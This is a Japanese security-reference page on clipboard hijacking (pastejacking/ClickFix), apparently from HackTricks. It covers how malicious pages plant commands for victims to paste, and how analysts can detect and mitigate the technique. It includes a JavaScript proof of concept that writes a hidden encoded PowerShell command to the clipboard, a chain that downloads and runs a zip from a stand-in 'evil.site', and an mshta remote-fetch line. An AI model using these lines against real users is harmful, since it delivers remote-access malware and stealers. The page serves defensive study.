# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "自分でコピーしていないものは絶対に貼り付けないこと。" – 古いが今でも有効なアドバイス

## 概要

Clipboard hijacking – 別名 *pastejacking* – は、ユーザーがコマンドを検査せずに日常的にコピー＆ペーストする事実を悪用します。悪意のあるウェブページ（またはElectronやデスクトップアプリケーションなどのJavaScript対応コンテキスト）は、攻撃者が制御するテキストをプログラム的にシステムクリップボードに配置します。被害者は、通常は巧妙に作成されたソーシャルエンジニアリングの指示によって、**Win + R**（実行ダイアログ）、**Win + X**（クイックアクセス / PowerShell）を押すか、ターミナルを開いてクリップボードの内容を*貼り付け*し、任意のコマンドを即座に実行するように促されます。

**ファイルはダウンロードされず、添付ファイルも開かれないため**、この手法は添付ファイル、マクロ、または直接コマンド実行を監視するほとんどのメールおよびウェブコンテンツのセキュリティ制御を回避します。したがって、この攻撃はNetSupport RAT、Latrodectusローダー、またはLumma Stealerなどのコモディティマルウェアファミリーを配信するフィッシングキャンペーンで人気があります。

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
古いキャンペーンでは `document.execCommand('copy')` が使用されていましたが、新しいものは非同期の **Clipboard API** (`navigator.clipboard.writeText`) に依存しています。

## ClickFix / ClearFake フロー

1. ユーザーがタイポスクワッティングされたか、侵害されたサイト（例: `docusign.sa[.]com`）を訪れます。
2. 注入された **ClearFake** JavaScript が `unsecuredCopyToClipboard()` ヘルパーを呼び出し、静かにBase64エンコードされたPowerShellワンライナーをクリップボードに保存します。
3. HTMLの指示が被害者に次のように伝えます: *“**Win + R** を押し、コマンドを貼り付けてEnterを押して問題を解決してください。”*
4. `powershell.exe` が実行され、正当な実行可能ファイルと悪意のあるDLLを含むアーカイブをダウンロードします（クラシックDLLサイドローディング）。
5. ローダーは追加のステージを復号し、シェルコードを注入し、永続性をインストールします（例: スケジュールされたタスク） – 最終的にNetSupport RAT / Latrodectus / Lumma Stealerを実行します。

### 例 NetSupport RAT チェーン
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (正当なJava WebStart) はそのディレクトリ内で `msvcp140.dll` を検索します。
* 悪意のあるDLLは **GetProcAddress** を使用してAPIを動的に解決し、**curl.exe** を介して2つのバイナリ（`data_3.bin`, `data_4.bin`）をダウンロードし、ローリングXORキー `"https://google.com/"` を使用してそれらを復号化し、最終的なシェルコードを注入し、**client32.exe** (NetSupport RAT) を `C:\ProgramData\SecurityCheck_v1\` に解凍します。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe**を使用して`la.txt`をダウンロードします。
2. **cscript.exe**内でJScriptダウンローダーを実行します。
3. MSIペイロードを取得 → 署名されたアプリケーションの横に`libcef.dll`をドロップ → DLLサイドローディング → シェルコード → Latrodectus。

### MSHTAを介したLumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** コールは、`PartyContinued.exe` を取得し、`Boat.pst` (CAB) を抽出し、`extrac32` とファイル連結を通じて `AutoIt3.exe` を再構築し、最終的にブラウザの資格情報を `sumeriavgv.digital` に流出させる `.a3x` スクリプトを実行する隠れた PowerShell スクリプトを起動します。

## 検出とハンティング

ブルーチームは、クリップボード、プロセス作成、およびレジストリのテレメトリを組み合わせて、ペーストジャッキングの悪用を特定できます：

* Windows レジストリ: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` は **Win + R** コマンドの履歴を保持します - 異常な Base64 / 難読化されたエントリを探します。
* セキュリティイベント ID **4688** (プロセス作成) で、`ParentImage` == `explorer.exe` かつ `NewProcessName` が { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } に含まれる場合。
* イベント ID **4663** は、疑わしい 4688 イベントの直前に `%LocalAppData%\Microsoft\Windows\WinX\` または一時フォルダ内でのファイル作成を示します。
* EDR クリップボードセンサー (存在する場合) – `Clipboard Write` の後に新しい PowerShell プロセスが直ちに続くことを相関させます。

## 緩和策

1. ブラウザの強化 – クリップボードの書き込みアクセスを無効にする (`dom.events.asyncClipboard.clipboardItem` など) またはユーザーのジェスチャーを要求します。
2. セキュリティ意識 – ユーザーに敏感なコマンドを *タイプ* するか、最初にテキストエディタに貼り付けるように教えます。
3. PowerShell 制約付き言語モード / 実行ポリシー + アプリケーションコントロールを使用して、任意のワンライナーをブロックします。
4. ネットワークコントロール – 既知のペーストジャッキングおよびマルウェア C2 ドメインへのアウトバウンドリクエストをブロックします。

## 関連トリック

* **Discord 招待ハイジャック** は、ユーザーを悪意のあるサーバーに誘導した後、同じ ClickFix アプローチを悪用することがよくあります：
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 参考文献

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
